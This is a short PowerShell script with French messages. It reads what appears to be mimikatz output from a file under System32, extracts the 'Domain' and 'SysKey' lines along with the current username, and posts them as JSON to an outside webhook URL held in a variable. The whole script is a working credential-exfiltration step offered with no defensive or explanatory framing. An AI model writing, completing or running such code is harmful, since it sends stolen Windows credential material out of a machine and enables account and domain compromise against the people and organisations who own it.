$hash = Get-Content -Path "C:\Windows\System32\mimikatz\mimi.txt"

$domain = $hash | Where-Object { $_ -match "Domain\s*:" }
$sysKey = $hash | Where-Object { $_ -match "SysKey\s*:" }
$username = $env:username

if ($domain.Count -eq 0 -or $sysKey.Count -eq 0) {
    $Body = @{
        'username' = "Erreur : Pas de données trouvées"
        'content'  = "Aucune donnée trouvée pour 'Domain :' ou 'SysKey'."
    }
} else {
    $Body = @{
        'username' = "Hash win de $username"
        'content'  = ($domain -join "`n") + "`n" + ($sysKey -join "`n")
    }
}

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ContentType "application/json"
